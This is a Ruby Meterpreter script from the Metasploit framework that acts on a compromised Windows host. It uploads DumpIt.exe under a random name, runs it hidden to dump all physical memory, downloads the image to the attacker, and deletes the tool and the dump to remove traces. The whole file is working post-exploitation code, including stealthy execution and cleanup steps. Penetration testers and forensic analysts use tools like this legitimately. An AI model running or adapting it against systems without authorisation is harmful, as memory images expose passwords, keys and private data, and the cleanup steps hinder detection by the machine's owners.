#!/usr/bin/env ruby
#Meterpreter script for dumping target memory for later analisys. 
#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
#Contributor sh4d0w4llk3r
#Verion: 1.0.0 


##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##

session = client
host,port = session.tunnel_peer.split(':')
# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
		"-h" => [ false,  "Help menu."                        ],
		"-d" => [ false,  "Dump Memory do not download"],
		"-t" => [ true,  "Change the timeout for download default 5min. Specify timeout in seconds"]
		)
# Expand enviroment %TEMP% variable to get location for storing image
tmp = session.fs.file.expand_path("%TEMP%")
# Create random name for the memory image
imgname = sprintf("%.5d",rand(100000))
# Create a directory for the logs
logs = ::File.join(Msf::Config.config_directory, 'logs', 'memdump', host + "-"+ ::Time.now.strftime("%Y%m%d.%M%S"))
# Create the log directory
::FileUtils.mkdir_p(logs)
# Setting timeout for command variable
timeoutsec = 300
#---------------------------------------------------------------------------------------------------------
#Dumping memory image
def memdump(session,tmp,imgname,timeoutsec)
	tmpout = []
	dumpitexe = File.join(Msf::Config.install_root, "data", "DumpIt.exe")
	dumpitscranble = sprintf("%.5d",rand(100000))
	print_status("Uploading DumpIt for dumping targets memory....")
	begin
		session.fs.file.upload_file("#{tmp}\\#{dumpitscranble}.exe","#{dumpitexe}")
		print_status("DumpIt uploaded as #{tmp}\\#{dumpitscranble}.exe")
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
	session.response_timeout=timeoutsec
	print "[*] Dumping target memory to #{tmp}\\#{imgname} "
	begin
		r = session.sys.process.execute("cmd.exe /c #{tmp}\\#{dumpitscranble}.exe /Q /J /O #{tmp}\\#{imgname}", nil, {'Hidden' => 'true','Channelized' => true})
		sleep(2)
		prog2check = "#{dumpitscranble}.exe"
		found = 0
		while found == 0
			session.sys.process.get_processes().each do |x|
				found =1
				if prog2check == (x['name'].downcase)
					print "."
					sleep(0.5)
					found = 0
				end
			end
		end
		r.channel.close
		r.close
		print "\n"
		print_status("Finnished dumping target memory")
		print_status("Deleting dumpit.exe from target...")
		session.sys.process.execute("cmd.exe /c del #{tmp}\\#{dumpitscranble}.exe", nil, {'Hidden' => 'true'})
		print_status("dumpit.exe deleted")
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end
#---------------------------------------------------------------------------------------------------------
#Downloading memory image
def imgdown(session,tmp,imgname,logs,timeoutsec)
	session.response_timeout=timeoutsec
	print_status("Downloading memory image to #{logs}")
	begin
		session.fs.file.download_file("#{logs}#{::File::Separator}#{imgname}.img", "#{tmp}\\#{imgname}")
		print_status("Finnished downloading memory image")
		#Deleting left over files
		print_status("Deleting left over files...")
		session.sys.process.execute("cmd.exe /c del #{tmp}\\#{imgname}", nil, {'Hidden' => 'true'})
		print_status("Memory image on target deleted")
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end

################## MAIN ##################
# Parsing of Option
hlp = 0
dwld = 0
chk = 0 
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
		when "-d"
			dwld = 1
		when "-t"
			timeoutsec = val
		when "-h"
			hlp = 1
			print(
			"Memory Dumper Meterpreter Script\n" +
			@@exec_opts.usage			
			)
			break

		end

}
if (hlp == 0)
	if (chk == 0)
		print_status("Running Meterpreter Memory Dump Script.....")
		memdump(session,tmp,imgname,timeoutsec)
		if (dwld == 0)
			imgdown(session,tmp,imgname,logs,timeoutsec)
		end
	
	end
end
